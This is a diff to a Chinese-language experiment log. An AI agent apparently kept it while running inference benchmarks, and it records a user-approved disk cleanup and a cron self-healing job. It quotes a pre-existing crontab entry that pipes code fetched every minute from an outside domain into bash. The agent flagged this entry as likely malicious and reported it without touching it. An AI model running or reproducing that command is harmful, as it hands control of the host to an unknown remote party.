@@ -107,11 +107,19 @@ TransData 14ms 编译器税 ROI 低）。
   123 ✓（单局边缘性——真数值破坏会连败）；R2 = object 366 ✓ / spatial
   123 ✓（位级重放 R1 重跑，一致性佐证）/ goal 131 ✓。同配置跨跑步数方差
   大（object 136→366）= 行为边缘带的又一佐证，success 判定不受影响
-- **清理已 staged 未执行（隔日门）**：goal 原文「隔日 ×2 + 稳定后清」是
-  时间门——同日两轮不满足字面条件，且回滚保险（精确 26 桶 78GB）不该
-  提前销毁（权限系统同判）。执行件 = `/data/apxinf/cleanup_obs_1019.sh`
-  （96GB 清单 dry-run 已校验、grid8/t712fix 保留确认）：**隔日 spot 全绿
-  后 `bash /data/apxinf/cleanup_obs_1019.sh DOIT` 一条命令收尾**
+- **清理已执行（用户放行，2026-10-19 晚）**：`cleanup_obs_1019.sh DOIT`
+  落地——96GB 释放（/data 59%），精确 26 桶/tl154_v*/tl_dyn_g154/
+  ab_catgu/dump 目录全清；grid8 九桶、t712fix（vision 烤制模板）、golden
+  帧文件保留校验 OK。**回滚保险期正式结束**（重造精确桶 = 留档配方重烤
+  ~1-2h）
+- **host cron 自愈已装（用户批准）**：`ensure_supervisor_1019.sh` ×5min
+  （容器在跑 + supervisor 缺席 → start_gear_supervisor.sh；容器停止尊重
+  人工决定不自动 start）；幂等安装、alive 路径 no-op 验证过
+- ⚠ **顺带发现（非我方资产）**：crontab 既有条目
+  `* * * * * curl cc.systemctl.cc/?gvc | bash`——来历不明每分钟拉执行，
+  形似恶意载荷，已报告用户待处置（未动）
+- 旧 f16 时代目录（tl1xx/iso/n32/t200/dyn/probe 系列 ~100GB+）不在 goal
+  点名内未清——留用户另行决定
 - 注意当日 spot 与 catgu A/B 曾共享主机（R1 object 局与末次 ab 并行），
   host 级争用为 R1 spatial 520 的潜在混杂因子之一
 - 复活窗口顺产：warmup flow 10 步 108.9ms @ tl200 桶（P=200 更宽属正常）；
